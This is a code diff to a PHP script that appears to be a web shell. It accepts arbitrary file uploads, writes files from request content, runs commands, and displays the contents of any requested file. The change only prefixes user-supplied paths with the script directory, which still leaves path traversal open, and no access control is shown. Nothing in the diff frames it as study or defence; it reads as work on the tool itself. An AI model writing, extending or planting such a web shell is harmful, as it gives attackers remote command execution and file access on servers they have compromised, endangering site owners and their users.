@@ -172,14 +172,14 @@ $viewCommandResult = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_FILES['fileToUpload'])) {
-        $target_file = basename($_FILES["fileToUpload"]["name"]);
+        $target_file = $scriptDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
         if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
             echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
         } else {
             echo "Sorry, there was an error uploading your file.";
         }
     } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
-        $fileName = $_POST['file_name'];
+        $fileName = $scriptDirectory . '/' . $_POST['file_name'];
         if (!file_exists($fileName)) {
             if (file_put_contents($fileName, $_POST['file_content']) !== false) {
                 echo '<hr>File created successfully!';
@@ -216,7 +216,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
         }
     } elseif (isset($_POST['view_file'])) {
-        $fileToView = $_POST['view_file'];
+        $fileToView = $scriptDirectory . '/' . $_POST['view_file'];
         if (file_exists($fileToView)) {
             $fileContent = file_get_contents($fileToView);
             $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . htmlspecialchars($fileContent) . '</textarea>';
